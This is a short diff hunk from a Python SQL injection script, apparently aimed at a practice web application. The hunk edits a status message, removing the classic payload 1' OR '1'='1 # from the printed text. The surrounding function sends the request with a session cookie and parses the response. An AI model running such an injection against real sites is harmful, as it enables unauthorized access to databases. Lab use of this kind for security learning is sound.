@@ -75,7 +75,7 @@ def SQLi(session_id):
     cookie = {"PHPSESSID": session_id, "security": security_level}
     headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
     
-    print ("Sending Evil SQL Payload 1' OR '1'='1 #")
+    print ("Sending Evil SQL Payload")
     r = requests.get(SQli_url, params=encoded_data, cookies=cookie, headers=headers, verify=False)
     soup = BeautifulSoup(r.text, "html.parser")
     soup.prettify()
